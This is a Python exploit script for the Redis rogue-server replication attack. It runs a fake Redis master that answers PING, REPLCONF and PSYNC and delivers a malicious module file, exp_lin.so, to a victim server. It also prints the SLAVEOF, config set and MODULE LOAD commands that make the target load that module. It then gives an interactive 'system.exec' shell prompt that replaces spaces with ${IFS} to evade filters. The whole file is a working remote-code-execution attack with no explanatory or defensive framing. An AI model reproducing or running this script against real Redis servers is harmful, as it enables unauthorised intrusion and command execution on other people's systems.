#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import socket
import time

CRLF="\r\n"
payload=open("exp_lin.so","rb").read()
exp_filename="exp_lin.so"

def redis_format(arr):
    global CRLF
    global payload
    redis_arr=arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len(x))+CRLF+x
    cmd+=CRLF
    return cmd

def interact_shell():
    flag=True
    try:
        while flag:
            shell=input("\033[1;32;40m[*]\033[0m ")
            shell=shell.replace(" ","${IFS}")
            if shell=="exit" or shell=="quit":
                flag=False
            else:
                print("system.exec {}".format(shell))
    except KeyboardInterrupt:
        return


def RogueServer(lport):
    global CRLF
    global payload
    flag=True
    result=""
    sock=socket.socket()
    sock.bind(("0.0.0.0",lport))
    sock.listen(10)
    clientSock, address = sock.accept()
    while flag:
        data = clientSock.recv(1024).decode()
        print(data)
        if "PING" in data:
            result="+PONG"+CRLF
            print(result)
            clientSock.send(result.encode())
            flag=True
        elif "REPLCONF" in data:
            result="+OK"+CRLF
            print(result)
            clientSock.send(result.encode())
            flag=True
        elif "PSYNC" in data or "SYNC" in data:
            result = "+FULLRESYNC " + "a" * 40 + " 1" + CRLF
            result += "$" + str(len(payload)) + CRLF
            print(result)
            result = result.encode()
            result += payload
            result += CRLF.encode()
            clientSock.send(result)
            flag=False
    clientSock.close()
    sock.close()

if __name__=="__main__":
    lport=1024

    lhost="127.0.0.1"
    print("SLAVEOF {} {}".format(lhost,lport))
    print("config set dir /tmp")
    print("config set dbfilename {}".format(exp_filename))
    print("MODULE LOAD /tmp/{}".format(exp_filename))
    interact_shell()

    RogueServer(lport)
